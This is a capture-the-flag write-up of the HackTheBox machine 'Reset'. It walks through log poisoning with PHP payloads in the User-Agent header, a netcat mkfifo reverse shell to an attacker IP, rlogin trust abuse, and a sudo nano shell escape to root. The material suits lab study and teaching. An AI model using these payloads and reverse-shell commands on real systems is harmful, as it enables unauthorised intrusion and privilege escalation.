# Reset HackTheBox

Reset is an Easy difficulty Linux machine which showcases abusing a password reset functionality in a web application following a log poisoning attack, to achieve Remote Code Execution. For privilege escalation, `Rservices` are abused, then a detached `tmux` session is used to abuse `sudo` privileges on `nano` text editor and execute commands as the root user.

![image.png](/assets/images/Reset_VL/image%201.png)

## Exploitation

Starting with enumeration part to find the open ports and services running on the box.

### Rustscan

```bash
rustscan -a 10.129.234.130 -r 1-65535 -- -sC -sV -vv -oA nmap/reset 10.129.234.130
```

![image.png](/assets/images/Reset_VL/image%202.png)

We have only 2 ports open on the box, one being ssh and other being the port 80 for http.

### Shell as www-data

Since this is a apache webserver, we know that the log directory of the apache webserver is /var/log/apache2/ and this directory contains the 2 important files access.log and error.log.

Ill capture the Log request and take a look at it.

![image.png](/assets/images/Reset_VL/image%208.png)

We can read the access.log file. Now there is a known vulnerbility in apache that when a LFI present (which in our case it is), User-Agent header injection maybe present on the server.

We can try injecting a php remote code execution payload in the Header User-Agent to be able to see results in the logs.

Some common payloads to which this is vulnerable are:

```bash
<?php echo `id`; ?>
```

![image.png](/assets/images/Reset_VL/image%209.png)

The id is getting printed via the access.log file, meaning we have code execution.

Similarly we can do this also.

```bash
<?php system('whoami'); ?>
```

![image.png](/assets/images/Reset_VL/image%2010.png)

We can also read the /etc/passwd file on the server.

```bash
User-Agent: <?php system('cat /etc/passwd'); ?>
```

![image.png](/assets/images/Reset_VL/image%2011.png)

Now lets get on the system using this netcat reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.91 9001 >/tmp/f
```

![image.png](/assets/images/Reset_VL/image%2012.png)

Listening on port 9001, we got a shell.

![image.png](/assets/images/Reset_VL/image%2013.png)

I also stablized the shell using the pty module.

Lets look for the users on the box.

![image.png](/assets/images/Reset_VL/image%2014.png)

We can read the user.txt file in the sadm user.

## Privilege Escalation

### Shell as SADM

Now for the privilege escalation part we know that the RSH service is open as earlier we saw in the nmap port results.

![image.png](/assets/images/Reset_VL/image%2015.png)

user sadm is trusted!.

So lets first create a local user named sadm on our box.

```bash
sudo useradd -m sadm
sudo passwd sadm
sudo su - sadm
rlogin -l sadm 10.129.234.130
```

![image.png](/assets/images/Reset_VL/image%2016.png)

Now we have a shell as sadm user.

### Shell as Root

Listing the current processes running as SADM.

![image.png](/assets/images/Reset_VL/image%2017.png)

we have a tmux session running.

```bash
tmux a
```

We got dropped inside a tmux session using the above command.

![image.png](/assets/images/Reset_VL/image%2018.png)

We can use nano and tail binary to escalate our privileges since these files are allowed to run as root.

Exploiting the nano binary using the GTFOBINS.

```bash
sudo /usr/bin/nano /etc/firewall.sh
^R^X
reset; sh 1>&0 2>&0
```

![image.png](/assets/images/Reset_VL/image%2019.png)

Abusing this we get the shell as root in the nano editor.

![image.png](/assets/images/Reset_VL/image%2020.png)

Rooted!
